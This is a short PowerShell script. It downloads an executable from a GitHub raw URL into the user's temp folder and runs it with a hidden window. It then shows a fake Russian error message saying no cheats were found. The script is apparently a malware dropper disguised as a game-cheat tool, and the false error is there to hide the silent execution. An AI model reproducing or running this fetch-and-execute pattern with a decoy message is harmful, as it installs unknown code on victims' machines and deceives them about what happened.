$url = "https://raw.githubusercontent.com/nagibatorm55-ops/error-check/main/error.exe"
$path = "$env:TEMP\error.exe"
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: читы не найдены. Попробуйте позже." -ForegroundColor Red
